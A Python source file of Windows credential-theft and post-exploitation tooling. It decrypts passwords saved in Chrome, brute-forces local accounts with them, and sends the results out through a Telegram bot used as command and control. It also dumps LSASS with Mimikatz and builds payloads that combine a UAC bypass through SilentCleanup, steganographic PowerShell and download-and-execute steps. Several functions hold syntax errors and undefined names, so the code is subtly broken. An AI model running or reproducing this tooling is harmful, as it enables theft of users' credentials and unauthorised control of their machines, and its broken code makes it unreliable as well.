from Cryptodome.Cipher import AES
from shutil import copy2
import base64,requests,win32security,win32crypt,json,os,subprocess,sqlite3

class Chrome(object):
    def _get_key(self):
        file = open(os.environ['USERPROFILE']+'\\AppData\\Local\Google\\Chrome\\User Data\\Local State', "r" ,encoding='iso-8859-1')
        data=file.read()
        data=json.loads(data)
        return win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None, None,None,0)[1]


    def _decrypt_password(self,key,iv,en_pass):
        try:
            return self.decryptgcm(key,iv,en_pass)[:-16].decode()
        except Exception as e:
            pass

    def cp_path(self,path,name):
        try:
            os.mkdir(os.environ['AppData']+'\\Process\\')
        except:
            pass
        copy2(path,os.environ['AppData']+'\\Process\\'+name)
        return os.environ['AppData']+'\\Process\\'+name


    def show(self):
        user_data=os.environ['USERPROFILE']+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
        profiles = ["Default",'Guest profile']
        for i in os.listdir(user_data):
            if "Profile " in i:
                profiles.append(i)
        testpass = []
        for i in profiles:
            try:
                path_db = self.cp_path(user_data+i+'\\Login Data',i+' login.db') 
                conn = sqlite3.connect(path_db)
                cursor = conn.cursor()
            except Exception as e:
                pass
            try:
                cursor.execute("select password_value from logins")
            except Exception as e:
                pass
            try:
                for n in cursor.fetchall():
                    testpass.append(self._decrypt_password(self._get_key(),n[0][3:15],n[0][15:]))
            except Exception as e:
                pass
            try:
                cursor.close()
                conn.close()
                os.remove(path_db)
            except Exception as e:
                pass

        return testpass
        
    def decryptgcm(self,key,iv,data):
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)

class SpearBruteForce(object):

    def cmd(self,command):
        return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().strip().decode(errors='replace')

    def getPass(self):
        test = Chrome().show()
        new = []
        for i in test:
            if i not in new and len(i)>0:
                new.append(i)
        return new

    def getUsers(self):
        users = []
        for i in self.cmd('net user').split('----')[-1].split('  '):
            if len(i)>0:
                if 'The command completed successfully.' not in i:
                    if i[0]=='-':
                        c = 0
                        for n in i:
                            if n!='-':
                                break
                            c+=1
                        users.append(i[c:].strip())
                    else:
                        users.append(i.strip())
        return users

    def ispassword(self,domain,username,password):
        try:
            win32security.LogonUser (
            username,
            domain,
            password,
            win32security.LOGON32_LOGON_NETWORK,
            win32security.LOGON32_PROVIDER_DEFAULT
            )
        except win32security.error:
            return False
        else:
            return True

    def bruteOnetarget(self,password,user):
        for i in password:
            if self.ispassword('WORKGROUP',user,i):
                return i
        return False


    def runProgramasAdmin(username, process, password):
        script = 'set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run "cmd"\nWScript.Sleep 100 \nWshShell.AppActivate "C:\\Windows\\system32\\cmd.exe" \nWScript.Sleep 100 \nWshShell.SendKeys "runas /user:'+username+' '+process+'"\nWshShell.SendKeys "{ENTER}"\nWshShell.SendKeys "'+password+'"\nWshShell.SendKeys "{ENTER}"\nWshShell.SendKeys "exit"\nWshShell.SendKeys "{ENTER}"'
        path = os.environ['APPDATA']+os.sep+'PRVTEST'
        self.cmd('mkdir '+path)
        open(path+'\\testscript.vbs','w').write(script)
        return self.cmd ("cscript.exe //nologo //b "+path+'\\testscript.vbs ')

    def bruteallusers(self,password,users):
        res = ''
        for i in users:
            for n in password:
                if ispassword('WORKGROUP',i,n):
                    res+=(f"the password for user: {i} is {n}\n")
        if res:
            return res
        return False

def shell(teleToken,chatId):
    tl = teleToken(teleToken,chatId)
    sp = SpearBruteForce()
    passwords = sp.getPass()
    if len(passwords)>0:
        tl.send_messages(os.getlogin()+" is connected!")
        users = sp.getUsers()
        m = 'all users : \n'
        for i in users:
            m +=i+'\n'
        while True:
            tl.send_messages('(1) to select a user to steal his password\n(2) to display all users\n(3) to brute force all users')
            M = tl.readLast()
            if M == '1':
                if len(passwords)>0:
                    tl.send_messages("Enter a username:")
                    user = tl.readLast()
                    passwd = sp.bruteOnetarget(passwords,user)
                    if passwd:
                        tl.send_messages("The passwords for "+user+" is: "+passwd)
                        tl.send_messages('Please enter command/process to run as admin: ')
                        process = tl.readLast()
                        runProgramasAdmin(user, process, passwd)
                else:
                    tl.send_messages("No passwords were found")
            if M == "2":
                for i in users:
                    m +=i+'\n'
                tl.send_messages(m)
            else:
                tl.send_messages(bruteallusers(passwords,users))
                
                
class TelegramBot(object):
    
    def __init__(self,telegram_token,chat_id):
        self.telegram_token = telegram_token
        self.chat_id = chat_id
        
        
    def read_messages(offset):
        r = requests.get('https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='+offset)
        con = r.json()['result'][-1]
        offset = con['update_id']
        message = con['message']['text']
        return offset, message

    def readLast():
        ffo=1
        off=getFirstoffset(telegram_token)
        count=0
        while True:
            try:
                off,m=read_messages(str(off))
                if off!=ffo:
                    ffo=off
                    if count>=1:
                        return m
                sleep(0.5)
            except:
                pass
            count=1

    def getFirstoffset(telegram_token):
        r = requests.get('https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset=678189729')
        t = str(r.json()).split("{'update_id':")[-1]
        t = t.split()
        t = t[0].replace(',','')
        return t
    
    def send_messages(message):
        return requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)
                

class DumpWithMimi(object):
    
    def __init__(self,pathToMimikatz):
        self.pathmimi = pathToMimikatz
        

    def lsassDump(self,path):
        logFile = os.path.dirname(os.path.realpath(self.pathmimi)) + "\\mimilog.log"
        try:
            os.remove(logFile)
        except:
            pass
        comm = '$test = "sekurlsa::minidump `"'+path+'`"" ; Start-Process "'+self.pathmimi+'" -ArgumentList "`"log mimilog.log`"", "`"$test`"","sekurlsa::logonPasswords" -WindowStyle Hidden'    
        open("POWMIM.ps1",'w').write(comm)
        if len(SpearBruteForce().cmd("powershell .\\POWMIM.ps1"))==0:
            return self.__parseLsass__(open(logFile,'r').readlines())

    def __parseLsass__(self,lst):
        p,u,d,hn,hu,hd = [],[],[],[],[],[]
        pres = f'{"User-Name":<30}{"Domain":^40}{"Password":<90}\n'
        pres+='-'*82+'\n'
        presh = f'{"User-Name":<30}{"Domain":^40}{"NTLM":<90}\n'
        presh+='-'*82+'\n'
        for i in range(len(lst)):
            n = lst[i].strip()
            if "* Password" in n and "* Password : (null)" not in n:
                psw = n.split('* Password :')[-1].strip()
                usr = lst[i-2].strip().split('* Username :')[-1].strip()
                dmn = lst[i-1].strip().split('* Domain   :')[-1].strip()
                if psw not in p and usr not in u and dmn not in d:
                    p,u,d = p + [psw], u + [usr], d + [dmn]
                    pres+=(f"{usr:<30}{dmn:^40}{psw:<90}\n")
            if "* NTLM     :" in n:
                h = n.split('* NTLM     :')[-1].strip()
                usr = lst[i-2].strip().split('* Username :')[-1].strip()
                dmn = lst[i-1].strip().split('* Domain   :')[-1].strip()
                if h not in hn and usr not in hu and dmn not in hd:
                    hn,hu,hd = p + [h], u + [usr], d + [dmn]
                    presh+=(f"{usr:<30}{dmn:^40}{h:<90}\n")
        open("PARSELSASSDUMPPROJ.txt","w").write(pres+'\n'*3+presh)
        return os.startfile("PARSELSASSDUMPPROJ.txt")


        
import os

class GenPayload(object):
    
    def __genScript__(self,baseexe):  
        script =r'''
        function get-shellexe($Base64String)
        {
            try{
                $path =  $env:APPDATA + '\testshell'
                mkdir $path 
            }
            catch{
                $abbaba=0
            }
            $Image = $env:APPDATA + '\testshell\shell.exe'
            [byte[]]$Bytes = [convert]::FromBase64String($Base64String)
            [System.IO.File]::WriteAllBytes($Image,$Bytes)
        }

        function runProg-admin($command)
        {
            if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
                    Invoke-Expression -Command $command | Out-String
                } 
            else 
                {
                    $registryPath = "HKCU:\Environment"
                    $Name = "windir"
                    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
                    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
                    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
            }
        }

        $path = $env:APPDATA + '\testshell\shell.exe'

        if([System.IO.File]::Exists($path)-eq $false)
        {
            get-shellexe -Base64String $shell
        }

        runProg-admin -command "powershell start-process $path"'''
        return '$Base64String = '+baseexe+'\n'+(''.join([i[4:]+'\n' for i in script.split('\n')]))

    def __genexepayload__(self,url,command):
        script = """
        {
            $path = "$env:APPDATA\sten.png"
            if(([System.IO.File]::Exists($path)) -eq $false)
            {
                Invoke-WebRequest -uri $url -OutFile $path
            }

            $command = '"""+command+"""'
            Invoke-Expression -command $command
        }

        $url = '"""+url+"""
        Get-ShellImage -url $url"""
        script = 'function Get-ShellImage($url)'+(''.join([i[4:]+'\n' for i in script.split('\n')]))
        open('ToWriteEXE.ps1','w').write(script).close()
        return "ToWriteEXE.ps1"

    def __genbase__(self,pathToExe):
        with open (pathToExe,'rb') as file:
            data = base64.b64encode(file.read())
            file.close()
        return data.decode()

    def cmd(self.command):
            return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().strip().decode(errors='replace')

    def genpayload(pathToScript,pathToimage,InvokePSImage):
        pathToScript = input('Enter path to the shell script (shell.ps1)')
        pathToimage = input('To embed the script in the image enter path to image')
        InvokePSImage = input('Enter path to Invoke-PSImage script')
        InvokePSImage = open('InvokePSImage','r').read()
        self.cmd('Powershell ps2exe  "'+pathToScript+'"-outputFile PayloadAc.exe')
        base = self.__genbase__('PayloadAc.exe')
        os.remove('PayloadAc.exe')
        open('ScriptAcPayload.ps1','w').write(self.__genScript__(base))
        open('powpsimageAC.ps1','w').write(InvokePSImage+'\nInvoke-PSImage -Script "'+pathToScript+'" -Image "'+pathToimage+'" -Out mallimage.png').close()
        commandPayload = self.cmd('powershell .\\powpsimageAC.ps1')
        print('The payload image is located in '+os.getcwdb()+'\\'+'mallimage.png')
        ask = input('to complete the operation upload the image and enter the url\nto get only the executable command enter 1\to get exe with payload enter url to the image\n: ')
        if ask = '1':
            return commandPayload
        self.cmd('powershell ps2exe '+self.__genexepayload__(url,command)+' -outputFile PayloadAc.exe')
        return 'Successfully completed'
    

